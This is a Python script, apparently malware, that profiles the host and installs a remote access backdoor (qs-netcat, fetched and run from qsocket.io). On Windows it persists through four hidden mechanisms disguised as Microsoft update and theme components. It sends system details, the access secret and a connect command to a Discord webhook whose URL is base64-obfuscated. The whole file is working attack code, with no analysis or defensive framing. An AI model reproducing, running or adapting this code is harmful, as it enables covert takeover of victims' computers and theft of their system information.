import os
import sys
import random
import string
import subprocess
import platform
import socket
import json
import base64
import urllib.request
import ssl
import time
from datetime import datetime

# ─────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────

def gen_secret(length=22):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def is_windows():
    return platform.system().lower() == 'windows'

def is_linux():
    return platform.system().lower() == 'linux'

# CREATE_NO_WINDOW evita flash de janela em subprocessos Windows.
# O ternary só avalia o lado escolhido — nunca acessa o atributo no Linux.
_NO_WIN = (
    {'creationflags': subprocess.CREATE_NO_WINDOW}
    if platform.system().lower() == 'windows'
    else {}
)

# ─────────────────────────────────────────
#  INFO DO SISTEMA
# ─────────────────────────────────────────

def safe_http_get(url, timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'curl/7.88.1'})
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.read().decode().strip()
    except:
        return None

def get_public_ip():
    for url in ['https://api.ipify.org', 'https://ifconfig.me', 'https://icanhazip.com']:
        r = safe_http_get(url)
        if r and len(r) < 50:
            return r
    return 'N/A'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return 'N/A'

def get_kernel():
    try:
        return subprocess.run(
            ['uname', '-r'], capture_output=True, text=True, **_NO_WIN
        ).stdout.strip()
    except:
        return 'N/A'

def get_arch():
    return platform.machine() or 'N/A'

def is_root():
    try:
        if is_linux():
            return os.geteuid() == 0
        if is_windows():
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        pass
    return False

def get_os_info():
    try:
        with open('/etc/os-release') as f:
            for line in f:
                if line.startswith('PRETTY_NAME'):
                    return line.split('=')[1].strip().strip('"')
    except:
        pass
    return platform.platform()

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            secs = float(f.read().split()[0])
        d = int(secs // 86400)
        h = int((secs % 86400) // 3600)
        m = int((secs % 3600) // 60)
        return f"{d}d {h}h {m}m"
    except:
        return 'N/A'

def get_cpu():
    try:
        with open('/proc/cpuinfo') as f:
            for line in f:
                if 'model name' in line:
                    return line.split(':')[1].strip()
    except:
        pass
    return platform.processor() or 'N/A'

def get_ram():
    try:
        with open('/proc/meminfo') as f:
            lines = f.readlines()
        total = int([l for l in lines if 'MemTotal'     in l][0].split()[1]) // 1024
        free  = int([l for l in lines if 'MemAvailable' in l][0].split()[1]) // 1024
        return f"{total - free}MB / {total}MB"
    except:
        return 'N/A'

def get_disk():
    try:
        r = subprocess.run(['df', '-h', '/'], capture_output=True, text=True, **_NO_WIN)
        p = r.stdout.strip().split('\n')[-1].split()
        return f"{p[2]} / {p[1]} ({p[4]})"
    except:
        return 'N/A'

def get_interfaces():
    try:
        r = subprocess.run(
            ['ip', '-br', 'addr'], capture_output=True, text=True, **_NO_WIN
        )
        ifaces = [l.split() for l in r.stdout.strip().split('\n') if l.split()[0] != 'lo']
        return ', '.join(f"{i[0]}({i[2] if len(i) > 2 else '?'})" for i in ifaces)
    except:
        return 'N/A'

def get_mac():
    try:
        import uuid
        return ':'.join(
            ['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 8 * 6, 8)][::-1]
        )
    except:
        return 'N/A'

def get_user():
    return os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return 'N/A'

def get_procs():
    try:
        return str(len([p for p in os.listdir('/proc') if p.isdigit()]))
    except:
        return 'N/A'

def get_shell():
    return os.environ.get('SHELL', 'N/A')

def get_crontab():
    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, **_NO_WIN)
        lines = [l for l in r.stdout.strip().split('\n') if l and not l.startswith('#')]
        return f"{len(lines)} entradas"
    except:
        return 'N/A'

# ─────────────────────────────────────────
#  DISCORD
# ─────────────────────────────────────────

_cfg = [
    b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9h',
    b'cGkvd2ViaG9va3MvMTUzODc2Njk4',
    b'MjQyODc1ODA3Ny9Ga0Rr',
    b'STcwQmhpMGEyUDAxcVdf',
    b'UVRWUHEyeHpDYTVXTVJF',
    b'YktMTl8xTEdXOU05bTRD',
    b'eGdRT1N5RFhxdFpjWkJS',
    b'aFNqTg==',
]

def _ep():
    return base64.b64decode(b''.join(_cfg)).decode()

def send_discord(secret, tool, connect_cmd, success=True):
    agora    = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    cor      = 0x00FF00 if success else 0xFF0000
    status   = "[OK]" if success else "[FAIL]"
    root_str = "ROOT" if is_root() else get_user()

    payload = {
        "embeds": [{
            "title": f"{status} {tool}",
            "color": cor,
            "fields": [
                {"name": "Data/Hora",  "value": agora,            "inline": True},
                {"name": "Sistema",    "value": get_os_info(),    "inline": True},
                {"name": "Kernel",     "value": get_kernel(),     "inline": True},
                {"name": "Arch",       "value": get_arch(),       "inline": True},
                {"name": "CPU",        "value": get_cpu(),        "inline": False},
                {"name": "RAM",        "value": get_ram(),        "inline": True},
                {"name": "Disco",      "value": get_disk(),       "inline": True},
                {"name": "Uptime",     "value": get_uptime(),     "inline": True},
                {"name": "IP Publico", "value": get_public_ip(),  "inline": True},
                {"name": "IP Local",   "value": get_local_ip(),   "inline": True},
                {"name": "Interfaces", "value": get_interfaces(), "inline": False},
                {"name": "MAC",        "value": get_mac(),        "inline": True},
                {"name": "Hostname",   "value": get_hostname(),   "inline": True},
                {"name": "User/Root",  "value": root_str,         "inline": True},
                {"name": "Shell",      "value": get_shell(),      "inline": True},
                {"name": "Processos",  "value": get_procs(),      "inline": True},
                {"name": "Crontab",    "value": get_crontab(),    "inline": True},
                {"name": "Secret Key", "value": f"`{secret}`",    "inline": False},
                {"name": "Conectar",   "value": f"`{connect_cmd}`", "inline": False},
            ],
            "footer": {"text": f"deploy.py | {get_hostname()} | {get_user()}"}
        }]
    }

    try:
        data = json.dumps(payload).encode()
        ctx  = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req  = urllib.request.Request(
            _ep(), data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'curl/7.88.1'},
            method='POST',
        )
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            pass
    except:
        pass

# ─────────────────────────────────────────
#  DOWNLOAD
# ─────────────────────────────────────────

def download_script(url):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req = urllib.request.Request(
            url, headers={'User-Agent': 'wget/1.21.3', 'Accept': '*/*'})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            content = r.read().decode()
            if content.strip().startswith('#'):
                return content
    except:
        pass

    for cmd in [
        ['curl', '-fsSk', url],
        ['wget', '-q', '--no-check-certificate', '-O', '-', url],
    ]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30, **_NO_WIN)
            if r.stdout and r.stdout.strip().startswith('#'):
                return r.stdout
        except:
            continue

    return None

# ─────────────────────────────────────────
#  VERIFY + DEPLOY QSOCKET LINUX
# ─────────────────────────────────────────

def verify_qsocket():
    try:
        config = os.path.expanduser('~/.config')
        for d in os.listdir(config):
            binary = os.path.join(config, d, 'qs-netcat')
            if os.path.isfile(binary):
                return True
    except:
        pass

    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if 'qs-netcat' in r.stdout:
            return True
    except:
        pass

    try:
        r = subprocess.run(['pgrep', '-f', 'qs-netcat'], capture_output=True)
        if r.returncode == 0:
            return True
    except:
        pass

    return False

def deploy_qsocket_linux(secret):
    script = download_script('https://qsocket.io/0')
    if not script:
        return False

    env = os.environ.copy()
    env['S'] = secret
    env.pop('WAYLAND_DISPLAY', None)
    env.pop('WAYLAND_SOCKET', None)

    try:
        subprocess.run(
            ['bash', '-c', script],
            env=env, timeout=180,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except:
        pass

    time.sleep(3)
    return verify_qsocket()

# ─────────────────────────────────────────
#  WINDOWS UTILS
# ─────────────────────────────────────────

def find_qsocket_binary_windows():
    """
    Retorna o path absoluto do qs-netcat.exe instalado pelo qsocket.io/1,
    ou None se não encontrado. Deve ser chamado após o sleep pós-install.
    """
    try:
        appdata = os.environ.get('APPDATA', '')
        if not appdata:
            return None
        for name in os.listdir(appdata):
            path = os.path.join(appdata, name, 'qs-netcat.exe')
            if os.path.isfile(path):
                return path
    except:
        pass
    return None

def _ps_cmd(binary_path, secret):
    """
    Bloco PowerShell compartilhado entre todos os mecanismos de persistência.
    - Verifica processo duplicado antes de spawnar (Get-Process -EA 0).
    - Usa single quotes no path → sem conflito com qualquer wrapper externo.
    - Escapa single quotes no path (raro mas possível em usernames).
    """
    path_esc = binary_path.replace("'", "''")
    return (
        f"if(-not(Get-Process qs-netcat -ErrorAction SilentlyContinue))"
        f"{{&'{path_esc}' -liqs {secret}}}"
    )

def _run_ps(script, timeout=30):
    """Executa um script PowerShell sem janela e sem output."""
    try:
        subprocess.run(
            ['powershell.exe',
             '-WindowStyle', 'Hidden',
             '-NonInteractive',
             '-Command', script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout,
            **_NO_WIN,
        )
    except:
        pass

# ─────────────────────────────────────────
#  PERSISTÊNCIA WINDOWS (sem admin)
# ─────────────────────────────────────────

def _persist_hkcu_run(binary_path, secret):
    """
    HKCU\\...\\Run — dispara no logon do usuário.
    Menos privilegiado possível, mais monitorado pelos AVs.
    """
    try:
        import winreg
        ps_inner = _ps_cmd(binary_path, secret)
        # Comando final: powershell oculto executando o bloco
        cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command "{ps_inner}"'
        )
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(k, 'WindowsUpdate', 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
    except:
        pass


def _persist_startup_vbs(binary_path, secret):
    """
    Startup folder via VBS — logon, independente do registry.
    WMI query previne processo duplicado.
    Run(..., 0, False) = janela oculta (não depende de WindowStyle do PS).

    Quoting VBS:
      - Strings delimitadas por double quotes
      - "" dentro de string = double quote literal
      - O ps_inner usa só single quotes no path → sem conflito
    """
    try:
        startup = os.path.join(
            os.environ.get('APPDATA', ''),
            r'Microsoft\Windows\Start Menu\Programs\Startup',
        )
        if not os.path.isdir(startup):
            return

        ps_inner = _ps_cmd(binary_path, secret)
        # Em VBS: "" = double quote. Então -Command "<ps_inner>" vira -Command ""<ps_inner>""
        vbs_run_cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command ""{ps_inner}""'
        )
        lines = [
            'Set wmi = GetObject("winmgmts:")',
            'Set procs = wmi.ExecQuery'
            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
            'If procs.Count = 0 Then',
            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
            'End If',
            '',
        ]
        vbs_path = os.path.join(startup, 'WindowsUpdate.vbs')
        with open(vbs_path, 'w') as f:
            f.write('\r\n'.join(lines))
    except:
        pass


def _persist_scheduled_task(binary_path, secret):
    """
    Scheduled task — AtLogon + repetição a cada 10 min indefinidamente.
    -Hidden oculta da UI do Task Scheduler (PS 3.0+, Windows 8+).
    -ExecutionTimeLimit 0 = sem timeout de execução.
    RepetitionDuration MaxValue = nunca para.

    Quoting:
      - O script PS externo usa double quotes como delimitador de string.
      - O -Argument do Action contém -Command `"<ps_inner>`"
        onde `" é escape de double quote dentro de string PS double-quoted.
      - Resultado: powershell.exe recebe -Command "<ps_inner>" corretamente.
    """
    try:
        ps_inner = _ps_cmd(binary_path, secret)
        script = (
            '$A = New-ScheduledTaskAction -Execute "powershell.exe"'
            f' -Argument "-WindowStyle Hidden -NonInteractive -Command `"{ps_inner}`"";'
            '$T1 = New-ScheduledTaskTrigger -AtLogOn;'
            '$T2 = New-ScheduledTaskTrigger -Once -At (Get-Date)'
            ' -RepetitionInterval (New-TimeSpan -Minutes 10)'
            ' -RepetitionDuration ([TimeSpan]::MaxValue);'
            '$S = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0;'
            'Register-ScheduledTask "MicrosoftEdgeUpdate"'
            ' -Action $A -Trigger $T1,$T2 -Settings $S -Force'
        )
        _run_ps(script)
    except:
        pass


def _persist_logon_script(binary_path, secret):
    """
    HKCU\\Environment\\UserInitMprLogonScript — hook de logon via
    network provider, menos monitorado que Run keys e scheduled tasks.

    Escreve um VBS launcher em %LOCALAPPDATA%\\Microsoft\\Windows\\
    (diretório existente, path plausível) e registra o wscript.exe
    apontando para ele. Mesmo padrão de quoting VBS do startup folder.
    """
    try:
        import winreg

        local = os.environ.get('LOCALAPPDATA', '')
        if not local:
            return

        # Diretório existente — evita criar pastas suspeitas
        target_dir = os.path.join(local, 'Microsoft', 'Windows')
        if not os.path.isdir(target_dir):
            return

        vbs_path = os.path.join(target_dir, 'ThemeService.vbs')
        ps_inner = _ps_cmd(binary_path, secret)
        vbs_run_cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command ""{ps_inner}""'
        )
        lines = [
            'Set wmi = GetObject("winmgmts:")',
            'Set procs = wmi.ExecQuery'
            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
            'If procs.Count = 0 Then',
            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
            'End If',
            '',
        ]
        with open(vbs_path, 'w') as f:
            f.write('\r\n'.join(lines))

        # Registra: wscript /B = silent (sem output de erros VBS em popup)
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Environment',
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            k, 'UserInitMprLogonScript', 0, winreg.REG_SZ,
            f'wscript.exe /B "{vbs_path}"',
        )
        winreg.CloseKey(k)
    except:
        pass


def _persist_all(binary_path, secret):
    """
    Aplica os 4 mecanismos independentemente.
    Falha individual não interrompe os demais.
    Ordem: do mais simples ao menos comum.
    """
    _persist_hkcu_run(binary_path, secret)       # logon, via registry
    _persist_startup_vbs(binary_path, secret)    # logon, via filesystem
    _persist_scheduled_task(binary_path, secret) # logon + periódico
    _persist_logon_script(binary_path, secret)   # logon, via network hook

# ─────────────────────────────────────────
#  DEPLOY QSOCKET WINDOWS
# ─────────────────────────────────────────

def deploy_qsocket_windows(secret):
    """
    1. Instala qs-netcat via qsocket.io/1 (PowerShell, oculto).
    2. Aguarda e resolve o path do binário.
    3. Se encontrado, registra todos os mecanismos de persistência.
    4. Retorna True se binário encontrado, False caso contrário.
    """
    try:
        ps = f'$env:S="{secret}"; $env:HIDE=1; irm qsocket.io/1 | iex'
        subprocess.run(
            ['powershell.exe',
             '-ExecutionPolicy', 'Bypass',
             '-WindowStyle', 'Hidden',
             '-NonInteractive',
             '-Command', ps],
            timeout=180,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            **_NO_WIN,
        )
    except:
        pass

    time.sleep(3)

    binary = find_qsocket_binary_windows()
    if not binary:
        return False

    _persist_all(binary, secret)
    return True

# ─────────────────────────────────────────
#  DAEMONIZE (Linux)
# ─────────────────────────────────────────

def daemonize():
    if not is_linux():
        return
    pid = os.fork()
    if pid > 0:
        sys.stdout.write(f"[*] Background pid: {pid}\n")
        sys.stdout.flush()
        os._exit(0)
    os.setsid()
    devnull = os.open(os.devnull, os.O_RDWR)
    os.dup2(devnull, 1)
    os.dup2(devnull, 2)
    os.close(devnull)

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    secret = gen_secret()

    if is_linux():
        daemonize()
        ok = deploy_qsocket_linux(secret)
        send_discord(secret, 'QSocket Linux', f'qs-netcat -i -s {secret}', success=ok)

    elif is_windows():
        ok = deploy_qsocket_windows(secret)
        send_discord(secret, 'QSocket Windows', f'qs-netcat -i -s {secret}', success=ok)

if __name__ == '__main__':
    main()
